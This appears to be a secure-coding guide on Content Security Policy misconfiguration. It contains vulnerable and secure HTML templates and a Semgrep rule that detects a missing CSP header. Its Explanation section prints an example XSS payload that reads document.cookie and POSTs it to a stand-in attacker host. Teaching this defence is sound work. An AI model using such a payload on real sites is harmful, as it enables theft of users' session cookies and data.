# Content Security Policy (CSP) Misconfiguration

### Concept

Content Security Policy (CSP) is a security mechanism that helps prevent cross-site scripting (XSS), clickjacking, and other code injection attacks. It allows web developers to specify which sources of content are trusted and can be loaded or executed by the web application. By defining a strict CSP, developers can mitigate the risk of malicious code being injected and executed in the context of their application.

CSP is implemented by adding a `Content-Security-Policy` HTTP response header or a `<meta>` tag in the HTML document. The policy consists of directives that specify the allowed sources for various types of content, such as scripts, stylesheets, images, fonts, and more.

### Vulnerable Scenario

Consider a web application that does not implement a Content Security Policy or has an overly permissive policy. The application allows user-generated content to be displayed on its pages without proper validation or sanitization.

#### Example Code (Vulnerable)

```html
<!DOCTYPE html>
<html>
<head>
  <title>Vulnerable Application</title>
</head>
<body>
  <h1>Welcome to the Vulnerable Application</h1>

  <div id="user-content">
    <%= userGeneratedContent %>
  </div>

  <script src="/path/to/script.js"></script>
</body>
</html>
```

### Explanation

In this example, the web application does not have a Content Security Policy defined. It directly renders user-generated content (`userGeneratedContent`) inside the `<div>` element without any validation or sanitization.

An attacker can exploit this vulnerability by injecting malicious scripts or content into the `userGeneratedContent`. For example, the attacker can submit the following malicious input:

```html
<script>
  // Malicious script that steals sensitive information
  var sensitiveData = document.cookie;
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://attacker.com/steal", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("data=" + encodeURIComponent(sensitiveData));
</script>
```

When this malicious input is rendered on the page, the attacker's script will be executed in the context of the application. The script can steal sensitive information, such as cookies or user data, and send it to the attacker's server.

### Prevention

To prevent content injection attacks and mitigate the risk of XSS, clickjacking, and other vulnerabilities, implement a strict Content Security Policy. Here's an example of a secure CSP implementation:

#### Example Code (Secure)

```html
<!DOCTYPE html>
<html>
<head>
  <title>Secure Application</title>
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    style-src 'self' https://trusted-cdn.com;
    img-src 'self' https://trusted-cdn.com;
    font-src 'self' https://trusted-cdn.com;
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
  ">
</head>
<body>
  <h1>Welcome to the Secure Application</h1>

  <div id="user-content">
    <%= sanitizedUserContent %>
  </div>

  <script src="/path/to/script.js"></script>
</body>
</html>
```

In the secure example, a strict Content Security Policy is defined using the `<meta>` tag. The policy consists of the following directives:

* `default-src 'self'`: Allows loading of resources only from the same origin (protocol, domain, and port) as the application.
* `script-src 'self' https://trusted-cdn.com`: Allows loading of scripts only from the same origin and a trusted CDN.
* `style-src 'self' https://trusted-cdn.com`: Allows loading of stylesheets only from the same origin and a trusted CDN.
* `img-src 'self' https://trusted-cdn.com`: Allows loading of images only from the same origin and a trusted CDN.
* `font-src 'self' https://trusted-cdn.com`: Allows loading of fonts only from the same origin and a trusted CDN.
* `object-src 'none'`: Disallows loading of plugins and other objects.
* `base-uri 'self'`: Restricts the base URL for relative URLs to the same origin.
* `form-action 'self'`: Allows form submissions only to the same origin.
* `frame-ancestors 'none'`: Disallows embedding of the application in frames or iframes from other origins.

Additionally, the user-generated content is sanitized (`sanitizedUserContent`) before being rendered on the page to remove any potentially malicious code.

By implementing a strict Content Security Policy and properly validating and sanitizing user input, the application significantly reduces the risk of content injection attacks and enhances its overall security posture.

### Conclusion

Content Security Policy is a powerful security mechanism that helps prevent cross-site scripting, clickjacking, and other code injection attacks. By defining a strict CSP and specifying the allowed sources for various types of content, developers can mitigate the risk of malicious code being executed in the context of their application. It is important to carefully craft the CSP directives based on the application's requirements and to regularly review and update the policy to ensure its effectiveness. Combining CSP with proper input validation and sanitization techniques provides a comprehensive defense against content injection vulnerabilities.

#### **Semgrep Rule**

Semgrep can be used to detect the absence or misconfiguration of Content Security Policy headers in your application.

```yaml
rules:
  - id: missing-csp-header
    patterns:
      - pattern: |
          def $HANDLER(...):
              ...
              return $RESPONSE
      - pattern-not: |
          def $HANDLER(...):
              ...
              $RESPONSE.headers['Content-Security-Policy'] = "..."
              ...
              return $RESPONSE
    message: "Content Security Policy (CSP) header is missing. Consider adding a strict CSP to prevent content injection attacks."
    languages:
      - python
    severity: WARNING
```

This Semgrep rule looks for HTTP response handlers that do not set the `Content-Security-Policy` header. It suggests adding a strict CSP to prevent content injection attacks.

Note that this rule is a starting point and may need to be adapted based on your specific application and framework. It is important to thoroughly test the CSP implementation to ensure it does not break legitimate functionality while providing adequate security.
